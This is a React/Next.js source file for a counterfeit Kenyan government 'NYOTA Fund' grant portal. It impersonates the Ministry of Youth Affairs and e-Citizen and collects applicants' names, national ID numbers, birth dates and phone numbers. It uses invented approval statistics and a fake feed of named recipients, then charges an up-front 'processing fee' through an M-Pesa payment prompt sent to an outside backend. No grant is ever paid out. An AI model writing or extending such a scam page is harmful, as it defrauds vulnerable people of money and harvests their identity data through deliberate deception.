"use client";
import { useState } from "react";

export default function Home() {
  const [page, setPage] = useState("home");

  const [form, setForm] = useState({
    name: "",
    id: "",
    dob: "",
    phone: "",
    county: "",
    subcounty: "",
    sim: "",
    purpose: "",
  });

  const [selectedAmount, setSelectedAmount] = useState<any>(null);

  const counties = [
    "Nairobi","Mombasa","Kisumu","Nakuru","Kiambu","Uasin Gishu","Machakos","Kajiado",
    "Meru","Nyeri","Kericho","Bungoma","Kakamega","Busia","Kilifi","Kwale","Garissa",
    "Mandera","Wajir","Turkana","Marsabit","Isiolo","Laikipia","Embu","Kirinyaga",
    "Murang'a","Nyandarua","Trans Nzoia","West Pokot","Bomet","Homa Bay","Migori",
    "Siaya","Taita Taveta","Tharaka Nithi","Samburu","Narok","Elgeyo Marakwet",
    "Nandi","Vihiga"
  ];

  const amounts = [
    { amount: 22000, fee: 250 },
    { amount: 32300, fee: 310 },
    { amount: 43800, fee: 390 },
    { amount: 50000, fee: 450 },
    { amount: 93300, fee: 550 },
    { amount: 102000, fee: 690 },
    { amount: 150000, fee: 750 },
    { amount: 200000, fee: 990 },
    { amount: 220000, fee: 1150 },
  ];

  const input =
    "w-full border border-gray-300 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-green-500 outline-none";

  const btnGreen =
    "bg-green-700 hover:bg-green-800 text-white px-5 py-2 rounded-xl font-semibold transition";

  const btnGray =
    "bg-gray-200 hover:bg-gray-300 px-5 py-2 rounded-xl transition";

    
const [loading, setLoading] = useState(false);
const [error, setError] = useState("");

  // ================= HEADER =================
  const Header = () => (
    <div className="bg-gradient-to-r from-red-700 via-black to-green-700 text-white shadow">
      <div className="max-w-4xl mx-auto px-4 py-3 flex justify-between items-center">
        
        <div className="flex items-center gap-3">
          <div className="w-10 h-6 rounded overflow-hidden border shadow-sm">
  <img 
    src="/kenya.png" 
    alt="Kenyan Flag" 
    className="w-full h-full object-cover"
  />
</div>

          <div>
            <h1 className="font-bold">NYOTA Fund</h1>
            <p className="text-xs opacity-80">Ministry of Youth Affairs & Sports</p>
          </div>
        </div>

        <div className="hidden sm:flex gap-4 text-sm">
          <span>e-Citizen</span>
          <span>Help</span>
          <span>My Account</span>
        </div>
      </div>
    </div>
  );
  const validateForm = () => {
  if (!form.name || !form.id || !form.dob || !form.phone || !form.county || !form.subcounty) {
    return "Please fill all personal details";
  }
  return "";
};

const validatePurpose = () => {
  if (!form.purpose) return "Please select purpose";
  return "";
};

const validateAmount = () => {
  if (!selectedAmount) return "Please select amount";
  return "";
};

  // ================= STEPS =================
  const Steps = ({ step }: any) => (
    <div className="flex justify-between mb-6 text-xs">
      {["Personal Info","Purpose","Amount","Payment"].map((s,i)=>(
        <div key={i} className="flex-1 text-center">
          <div className={`w-10 h-10 mx-auto rounded-full flex items-center justify-center font-bold border transition
          ${step===i?"bg-green-600 text-white shadow":"bg-gray-200 text-gray-500"}`}>
            {i+1}
          </div>
          <p className={`mt-2 ${step===i?"text-green-600":"text-gray-500"}`}>{s}</p>
        </div>
      ))}
    </div>
  );

  // ================= HOME =================
  if(page==="home"){
    return(
      <div className="min-h-screen bg-gray-100">
        <Header/>

        <main className="max-w-md mx-auto p-4">

          <div className="bg-gradient-to-b from-red-700 to-red-500 text-white p-6 rounded-2xl text-center shadow-lg">
            <h1 className="text-2xl font-bold">NYOTA Fund</h1>
            <p>Official Government Youth Empowerment Program</p>
          </div>

          <div className="bg-white mt-5 p-4 rounded-2xl shadow border space-y-3">

            {[
              "Up to KSh 220,000 Grant",
              "Business Training & Mentorship",
              "Fast Disbursement",
              "Government Guaranteed"
            ].map((f)=>(
              <div key={f} className="flex justify-between border rounded-xl p-3 bg-gray-50 hover:shadow transition">
                <span>{f}</span>
                <span className="bg-green-600 text-white w-6 h-6 flex items-center justify-center rounded-full">✓</span>
              </div>
            ))}

            <div className="bg-yellow-100 border p-3 rounded-xl text-sm">
              Official NYOTA Fund portal. One application per National ID.
            </div>

            <button onClick={()=>setPage("form")} className="w-full bg-green-700 hover:bg-green-800 text-white py-3 rounded-xl font-semibold">
              Apply Now
            </button>

          </div>
        </main>
      </div>
    )
  }

  // ================= FORM =================
  if(page==="form"){
    return(
      <div className="min-h-screen bg-gray-100">
        <Header/>

        <main className="max-w-md mx-auto p-4">
          <Steps step={0}/>

          <div className="bg-white rounded-2xl shadow border overflow-hidden">

            <div className="p-5 border-b">
              <h2 className="font-bold text-lg">Personal Information</h2>
              <p className="text-sm text-gray-500">
                Please provide your details as they appear on your National ID Card
              </p>
            </div>

            <div className="p-5 space-y-4">

              <input className={input} placeholder="Enter full name as on ID"
              onChange={(e)=>setForm({...form,name:e.target.value})}/>

              <div className="grid grid-cols-2 gap-3">
                <input className={input} placeholder="Enter Your ID"
                onChange={(e)=>setForm({...form,id:e.target.value})}/>
                <input className={input} placeholder="DD/MM/YYYY"
                onChange={(e)=>setForm({...form,dob:e.target.value})}/>
              </div>

              <div>
                <input className={input} placeholder="07XXXXXXXX"
                onChange={(e)=>setForm({...form,phone:e.target.value})}/>
                <p className="text-xs text-gray-500">Must be registered in your name</p>
              </div>

              <select className={input}
              onChange={(e)=>setForm({...form,county:e.target.value})}>
                <option>Select County</option>
                {counties.map(c=><option key={c}>{c}</option>)}
              </select>

              <input className={input} placeholder="Sub-county"
              onChange={(e)=>setForm({...form,subcounty:e.target.value})}/>

              <select className={input}
              onChange={(e)=>setForm({...form,sim:e.target.value})}>
                <option>Yes, in my name</option>
                <option>No</option>
              </select>

              <div className="flex justify-between">
                          {error && <p className="text-red-500 text-sm">{error}</p>}

                <button onClick={()=>setPage("home")} className={btnGray}>Back</button>
<button
  onClick={() => {
    const err = validateForm();
    if (err) return setError(err);
    setError("");
    setPage("purpose");
  }}
  className={btnGreen}
>
  Continue
</button>              </div>

            </div>

            <div className="text-center text-xs p-3 text-gray-500 border-t">
              © 2024 Republic of Kenya. Secured by e-Citizen
            </div>

          </div>
        </main>
      </div>
    )
  }

  // ================= PURPOSE =================
  if(page==="purpose"){
    return(
      <div className="min-h-screen bg-gray-100">
        <Header/>
        <main className="max-w-md mx-auto p-4">

          <Steps step={1}/>

          <div className="bg-white p-5 rounded-2xl shadow border space-y-3">

            {[
              ["Start a Business","New venture capital"],
              ["Expand Business","Growth & expansion"],
              ["School Fees","Education support"],
              ["Hospital Bill","Medical emergency"],
              ["Emergency","Urgent needs"]
            ].map(([t,d])=>(
              <div key={t}
              onClick={()=>setForm({...form,purpose:t})}
              className={`border rounded-xl p-3 cursor-pointer transition
              ${form.purpose===t?"border-green-600 bg-green-50 shadow-lg scale-[1.02]":"hover:shadow"}`}>
                <h3 className="font-semibold text-gray-900">{t}</h3>
<p className="text-sm text-gray-500">{d}</p>
              </div>
            ))}

            <div className="flex justify-between">
                        {error && <p className="text-red-500 text-sm">{error}</p>}

              <button onClick={()=>setPage("form")} className={btnGray}>Back</button>
<button
  onClick={() => {
    const err = validatePurpose();
    if (err) return setError(err);
    setError("");
    setPage("amount");
  }}
  className={btnGreen}
>
  Continue
</button>            </div>

          </div>
        </main>
      </div>
    )
  }

 if(page==="amount"){
  return(
    <div className="min-h-screen bg-gray-100">
      <Header/>
      <main className="max-w-md mx-auto p-4">

        <Steps step={2}/>

        <div className="bg-white p-5 rounded-2xl shadow border">

          <h2 className="font-bold text-lg mb-1">Select Amount</h2>
          <p className="text-sm text-gray-500 mb-4">
            Choose the loan amount that suits your needs
          </p>

          <div className="grid grid-cols-2 gap-3">
            {amounts.map(a=>(
              <div key={a.amount}
                onClick={()=>setSelectedAmount(a)}
                className={`border rounded-xl p-4 cursor-pointer text-center transition
                ${selectedAmount?.amount===a.amount
                  ?"border-green-600 bg-green-50 shadow"
                  :"hover:shadow"}`}>

                <div className="text-lg font-bold">
                  KSh {a.amount.toLocaleString()}
                </div>

                <div className="mt-2 text-xs bg-green-100 text-green-700 px-2 py-1 rounded-full inline-block">
                  Fee: KSh {a.fee}
                </div>
              </div>
            ))}
          </div>
          <div className="mt-5 space-y-2">

  <div className="bg-green-50 border rounded-xl p-3 text-sm">
    ✅ 3,482 applications approved this week
  </div>

  <div className="bg-blue-50 border rounded-xl p-3 text-sm">
    🔒 Secured by Government of Kenya & e-Citizen
  </div>

  <div className="bg-gray-50 border rounded-xl p-3 text-sm">
    ⚡ Average disbursement time: 5 minutes
  </div>

</div>


{/* ===== TRUST ACTIVITY (SMALL FLOAT FEED) ===== */}
<div className="mt-6 h-24 overflow-hidden relative">
  <div className="animate-scroll space-y-2 text-xs">

    {[
      "Brian from Nairobi received KSh 50,000 • 2 hrs ago",
      "Faith from Nakuru received KSh 22,000 • 30 mins ago",
      "Kevin from Kisumu received KSh 93,300 • 1 hr ago",
      "Mercy from Eldoret received KSh 150,000 • 45 mins ago",
      "James from Kiambu received KSh 32,300 • 20 mins ago",
      "Ann from Mombasa received KSh 200,000 • 3 hrs ago",
      "Peter from Machakos received KSh 43,800 • 50 mins ago",
      "Diana from Kakamega received KSh 102,000 • 1 hr ago",
      "John from Nyeri received KSh 22,000 • 15 mins ago",
      "Sharon from Bungoma received KSh 50,000 • 10 mins ago",
    ].map((item, i) => (
      <div
        key={i}
        className="bg-green-50 border border-green-200 px-3 py-2 rounded-lg shadow-sm"
      >
        {item}
      </div>
    ))}

  </div>
</div>


     <div className="flex justify-between mt-5">
       {error && <p className="text-red-500 text-sm">{error}</p>}

            <button onClick={()=>setPage("purpose")} className={btnGray}>Back</button>
<button
  onClick={() => {
    const err = validateAmount();
    if (err) return setError(err);
    setError("");
    setPage("payment");
  }}
  className={btnGreen}
>
  Continue
</button>          </div>

        </div>
      </main>
    </div>
  )
}
if (page === "payment") {
  return (
    <div className="min-h-screen bg-gray-100">
      <Header />
      <main className="max-w-md mx-auto p-4">

        <Steps step={3} />

        <div className="bg-white p-5 rounded-2xl shadow border space-y-4">

          <h2 className="font-bold text-lg">Confirm & Pay</h2>

          <div className="bg-gray-50 p-4 rounded-xl text-sm space-y-2">
            <p><b>Full Name:</b> {form.name}</p>
            <p><b>ID Number:</b> {form.id}</p>
            <p><b>Phone:</b> {form.phone}</p>
            <p><b>Location:</b> {form.subcounty}, {form.county}</p>
            <p><b>Purpose:</b> {form.purpose}</p>
            <p><b>Loan Amount:</b> KSh {selectedAmount?.amount?.toLocaleString()}</p>
          </div>

          <div className="bg-red-50 border p-4 rounded-xl flex justify-between items-center">
            <span className="font-medium">Processing Fee</span>
            <span className="text-red-600 font-bold text-lg">
              KSh {selectedAmount?.fee ?? 0}
            </span>
          </div>

          <div className="bg-yellow-100 p-3 rounded-xl text-sm">
            Funds disbursed to your M-Pesa within 5 minutes after successful payment
          </div>

          {error && <p className="text-red-500 text-sm">{error}</p>}

          <button
            onClick={async () => {
              if (!selectedAmount?.fee) {
                setError("Invalid amount");
                return;
              }

              setLoading(true);
              setError("");

              try {
                // FORMAT PHONE
                let phone = (form.phone || "").replace(/\D/g, "");

                if (phone.startsWith("07") || phone.startsWith("01")) {
                  phone = "254" + phone.slice(1);
                } else if (phone.startsWith("0")) {
                  phone = "254" + phone.slice(1);
                } else if (phone.startsWith("254")) {
                  // already correct
                } else {
                  throw new Error("Invalid phone format");
                }

                // FINAL VALIDATION
                if (!/^254\d{9}$/.test(phone)) {
                  throw new Error("Phone must be 07XXXXXXXX, 01XXXXXXXX or 254XXXXXXXXX");
                }

                const res = await fetch("https://payhero-backend-m78g.onrender.com/api/runPrompt", {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/json",
                  },
                  body: JSON.stringify({
                    phone,
                    amount: Number(selectedAmount.fee),
                    local_id: Date.now().toString(), // ✅ REQUIRED
                    transaction_desc: "NYOTA Fund Payment",
                  }),
                });

                let data: any = {};
                try {
                  data = await res.json();
                } catch {
                  // ignore JSON errors
                }

                if (!res.ok || data?.status === false) {
                  throw new Error(data?.msg || "Payment request failed");
                }

                setError("");

              } catch (err: unknown) {
                const message =
                  err instanceof Error ? err.message : "Payment failed";
                setError(message);
              } finally {
                setLoading(false);
              }
            }}
            disabled={loading}
            className="w-full bg-green-700 hover:bg-green-800 text-white py-3 rounded-xl font-bold"
          >
            {loading ? "Processing..." : `Pay KSh ${selectedAmount?.fee ?? 0} with M-Pesa`}
          </button>

          <div className="flex justify-between">
            <button onClick={() => setPage("amount")} className={btnGray}>Back</button>
            <button onClick={() => setPage("home")} className={btnGreen}>Finish</button>
          </div>

        </div>
      </main>
    </div>
  );
}
  return null;
}
